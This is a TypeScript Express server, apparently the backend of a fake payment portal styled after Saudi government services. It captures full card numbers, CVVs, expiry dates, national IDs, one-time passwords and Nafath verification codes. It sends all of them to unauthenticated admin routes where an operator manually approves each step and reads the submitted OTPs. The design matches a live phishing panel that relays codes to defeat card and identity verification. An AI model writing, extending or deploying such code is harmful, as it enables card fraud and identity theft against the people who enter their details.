import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';

// Types for Transaction and Credit Card
interface Transaction {
  id: string;
  cardNumber: string; // Plain card number for standard full transparency
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED';
  otpCode: string;
  submittedOtp?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
  nafathCode?: string;
}

// In-memory Database
let nafathConfig = {
  currentCode: '26'
};

let transactions: Transaction[] = [
  {
    id: 'tx-1001',
    cardNumber: '4111 1111 1111 1111',
    cardholderName: 'Alice Johnson',
    expiry: '12/28',
    cvv: '422',
    cardType: 'visa',
    amount: 250.00,
    timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
    status: 'APPROVED',
    otpCode: '852014',
    submittedOtp: '852014',
    serviceName: 'استشارة قانونية فورية'
  },
  {
    id: 'tx-1002',
    cardNumber: '5555 5555 5555 5555',
    cardholderName: 'Michael Chen',
    expiry: '08/27',
    cvv: '987',
    cardType: 'mastercard',
    amount: 1249.99,
    timestamp: new Date(Date.now() - 3600000 * 5).toISOString(),
    status: 'REJECTED',
    otpCode: '315792',
    submittedOtp: '111111',
    serviceName: 'رخصة بلدية تجارية'
  },
  {
    id: 'tx-1003',
    cardNumber: '3782 822463 10005',
    cardholderName: 'Sarah Jenkins',
    expiry: '04/29',
    cvv: '2001',
    cardType: 'amex',
    amount: 89.00,
    timestamp: new Date(Date.now() - 60000 * 15).toISOString(),
    status: 'PENDING_CARD_APPROVAL',
    otpCode: '147852',
    serviceName: 'توثيق عقد عقاري'
  },
  {
    id: 'tx-1004',
    cardNumber: '6011 0000 0000 0000',
    cardholderName: 'David Miller',
    expiry: '11/30',
    cvv: '456',
    cardType: 'discover',
    amount: 15.50,
    timestamp: new Date(Date.now() - 60000 * 32).toISOString(),
    status: 'PENDING_CARD_APPROVAL',
    otpCode: '963258',
    serviceName: 'شهادة صحية للعمل'
  }
];

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;

  // Body parser middleware
  app.use(express.json());

  // --- API Routes ---

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  // Get active Nafath verification code
  app.get('/api/nafath-config', (req, res) => {
    res.json(nafathConfig);
  });

  // Update Nafath verification code (called from Admin Portal)
  app.post('/api/nafath-config', (req, res) => {
    const { currentCode } = req.body;
    if (currentCode !== undefined && typeof currentCode === 'string') {
      nafathConfig.currentCode = currentCode.trim().substring(0, 4); // Limit to 4 chars for aesthetics
      return res.json({ success: true, nafathConfig });
    }
    return res.status(400).json({ error: 'Invalid or missing currentCode.' });
  });

  // Get all transactions
  app.get('/api/transactions', (req, res) => {
    res.json(transactions);
  });

  // Standalone Admin Portal transactions fetch route
  app.get('/api/admin/transactions', (req, res) => {
    res.json(transactions);
  });

  // Standalone Admin Portal update status route
  app.post('/api/admin/update-status', (req, res) => {
    const { id, status, nafathCode } = req.body;

    if (!id) {
      return res.status(400).json({ error: 'Missing required field (id).' });
    }

    const txIndex = transactions.findIndex(t => t.id === id);
    if (txIndex === -1) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }

    if (status) {
      if (!['PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED', 'AWAITING_NAFATH', 'NAFATH_VERIFIED'].includes(status)) {
        return res.status(400).json({ error: 'Invalid target status.' });
      }
      transactions[txIndex].status = status;
      if (status === 'NAFATH_VERIFIED') {
        transactions[txIndex].nafathVerified = true;
      }
    }

    if (nafathCode !== undefined) {
      transactions[txIndex].nafathCode = nafathCode.trim().substring(0, 4);
    }

    return res.json({
      success: true,
      transaction: transactions[txIndex]
    });
  });

  // Get single transaction details
  app.get('/api/transactions/:id', (req, res) => {
    const { id } = req.params;
    const tx = transactions.find(t => t.id === id);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }
    res.json(tx);
  });

  // GET /api/status/[id]: Return status & relevant info of transaction
  app.get('/api/status/:id', (req, res) => {
    const { id } = req.params;
    const tx = transactions.find(t => t.id === id);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }
    res.json({
      id: tx.id,
      status: tx.status,
      otpCode: tx.otpCode,
      submittedOtp: tx.submittedOtp,
      amount: tx.amount,
      cardType: tx.cardType,
      cardNumber: tx.cardNumber,
      cardholderName: tx.cardholderName,
      serviceName: tx.serviceName,
      nationalId: tx.nationalId,
      nafathVerified: tx.nafathVerified,
      nafathCode: tx.nafathCode
    });
  });

  // POST /api/nafath-start: Create a pending Nafath session transaction
  app.post('/api/nafath-start', (req, res) => {
    const { nationalId, serviceName, amount } = req.body;

    if (!nationalId) {
      return res.status(400).json({ error: 'Missing national ID.' });
    }

    const finalAmount = amount ? parseFloat(amount) : 100.00;
    const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
    const newTxId = `tx-${Math.floor(100000 + Math.random() * 900000)}`;
    const randomNafathCode = Math.floor(10 + Math.random() * 90).toString(); // Generate unique Nafath code 10-99

    const newTx: Transaction = {
      id: newTxId,
      cardNumber: 'Awaiting Card...',
      cardholderName: 'Awaiting Cardholder Name...',
      expiry: '--/--',
      cvv: '---',
      cardType: 'unknown',
      amount: finalAmount,
      timestamp: new Date().toISOString(),
      status: 'AWAITING_NAFATH',
      otpCode: randomOtp,
      serviceName: serviceName || 'خدمة عامة',
      nationalId,
      nafathVerified: false,
      nafathCode: ""
    };

    transactions.unshift(newTx);

    return res.json({
      success: true,
      transaction: newTx
    });
  });

  // POST /api/nafath-verify: Complete Nafath matching step on server
  app.post('/api/nafath-verify', (req, res) => {
    const { id } = req.body;
    if (!id) {
      return res.status(400).json({ error: 'Missing transaction ID.' });
    }

    const tx = transactions.find(t => t.id === id);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }

    tx.status = 'NAFATH_VERIFIED';
    tx.nafathVerified = true;

    return res.json({
      success: true,
      transaction: tx
    });
  });

  // POST /api/pay-update: Update the pending transaction with real card info
  app.post('/api/pay-update', (req, res) => {
    const { id, cardNumber, cardholderName, expiry, cvv, cardType } = req.body;

    if (!id || !cardNumber || !cardholderName || !expiry || !cvv) {
      return res.status(400).json({ error: 'Missing required update fields.' });
    }

    const tx = transactions.find(t => t.id === id);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }

    tx.cardNumber = cardNumber;
    tx.cardholderName = cardholderName.trim();
    tx.expiry = expiry;
    tx.cvv = cvv;
    tx.cardType = cardType || 'unknown';
    tx.status = 'PENDING_CARD_APPROVAL';

    return res.json({
      success: true,
      transaction: tx
    });
  });

  // POST /api/pay: Create transaction, generate OTP, set status PENDING_CARD_APPROVAL
  app.post('/api/pay', (req, res) => {
    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName, nationalId, nafathVerified } = req.body;

    if (!cardNumber || !cardholderName || !expiry || !cvv) {
      return res.status(400).json({ error: 'Missing required payment fields.' });
    }

    const finalAmount = amount ? parseFloat(amount) : Math.floor(Math.random() * 450) + 10 + 0.99;
    
    // Generate a random 6 digit OTP Code
    const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
    const newTxId = `tx-${Math.floor(100000 + Math.random() * 900000)}`;

    const newTx: Transaction = {
      id: newTxId,
      cardNumber,
      cardholderName: cardholderName.trim(),
      expiry,
      cvv,
      cardType: cardType || 'unknown',
      amount: finalAmount,
      timestamp: new Date().toISOString(),
      status: 'PENDING_CARD_APPROVAL',
      otpCode: randomOtp,
      serviceName: serviceName || 'خدمة عامة',
      nationalId,
      nafathVerified
    };

    transactions.unshift(newTx);

    return res.json({
      success: true,
      message: 'Transaction successfully initialized.',
      transaction: newTx
    });
  });

  // Submit a new transaction (alternative backward compatible endpoint)
  app.post('/api/submit', (req, res) => {
    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName, nationalId, nafathVerified } = req.body;

    if (!cardNumber || !cardholderName || !expiry || !cvv) {
      return res.status(400).json({ error: 'Missing required payment fields.' });
    }

    const finalAmount = amount ? parseFloat(amount) : Math.floor(Math.random() * 450) + 10 + 0.99;
    const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
    const newTxId = `tx-${Math.floor(100000 + Math.random() * 900000)}`;

    const newTx: Transaction = {
      id: newTxId,
      cardNumber,
      cardholderName: cardholderName.trim(),
      expiry,
      cvv,
      cardType: cardType || 'unknown',
      amount: finalAmount,
      timestamp: new Date().toISOString(),
      status: 'PENDING_CARD_APPROVAL',
      otpCode: randomOtp,
      serviceName: serviceName || 'خدمة عامة',
      nationalId,
      nafathVerified
    };

    transactions.unshift(newTx);

    return res.json({
      success: true,
      message: 'Transaction submitted successfully for administrative review.',
      transaction: newTx
    });
  });

  // POST /api/admin/action: Update status by ID (Approve/Reject)
  app.post('/api/admin/action', (req, res) => {
    const { id, status } = req.body;

    if (!id || !status) {
      return res.status(400).json({ error: 'Missing required fields (id, status).' });
    }

    if (!['PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'].includes(status)) {
      return res.status(400).json({ error: 'Invalid target status.' });
    }

    const txIndex = transactions.findIndex(t => t.id === id);
    if (txIndex === -1) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }

    transactions[txIndex].status = status;

    return res.json({
      success: true,
      transaction: transactions[txIndex]
    });
  });

  // Approve or Reject a transaction via path parameter (backward compatible dashboard)
  app.post('/api/transactions/:id/status', (req, res) => {
    const { id } = req.params;
    const { status } = req.body;

    // Map legacy status codes if sent from dashboard
    let targetStatus: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' = 'PENDING_CARD_APPROVAL';
    if (status === 'Approved' || status === 'AWAITING_OTP') {
      targetStatus = 'AWAITING_OTP';
    } else if (status === 'Rejected' || status === 'REJECTED') {
      targetStatus = 'REJECTED';
    } else if (status === 'Pending' || status === 'PENDING_CARD_APPROVAL') {
      targetStatus = 'PENDING_CARD_APPROVAL';
    } else {
      targetStatus = status;
    }

    const txIndex = transactions.findIndex(t => t.id === id);
    if (txIndex === -1) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }

    transactions[txIndex].status = targetStatus;

    return res.json({
      success: true,
      transaction: transactions[txIndex]
    });
  });

  // POST /api/verify-otp: Submit the OTP and set status to OTP_SUBMITTED
  app.post('/api/verify-otp', (req, res) => {
    const { id, otp } = req.body;

    if (!id || !otp) {
      return res.status(400).json({ error: 'Missing required code verification fields.' });
    }

    const tx = transactions.find(t => t.id === id);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }

    tx.submittedOtp = otp.trim();
    tx.status = 'OTP_SUBMITTED';

    return res.json({
      success: true,
      message: 'OTP submitted successfully for administrative review.',
      transaction: tx
    });
  });

  // Delete a transaction (Optional convenience)
  app.delete('/api/transactions/:id', (req, res) => {
    const { id } = req.params;
    const txIndex = transactions.findIndex(t => t.id === id);
    if (txIndex === -1) {
      return res.status(404).json({ error: 'Transaction not found.' });
    }
    transactions.splice(txIndex, 1);
    return res.json({ success: true, message: 'Transaction cleared.' });
  });

  // --- Vite Dev Server Middleware vs Production Static Assets ---
  const isProduction = process.env.NODE_ENV === 'production' || 
                       (typeof __filename !== 'undefined' && __filename.includes('dist')) ||
                       !fs.existsSync(path.join(process.cwd(), 'server.ts'));

  if (!isProduction) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[3D-Card-Server] Running on http://localhost:${PORT} in ${process.env.NODE_ENV || 'development'} mode`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
});
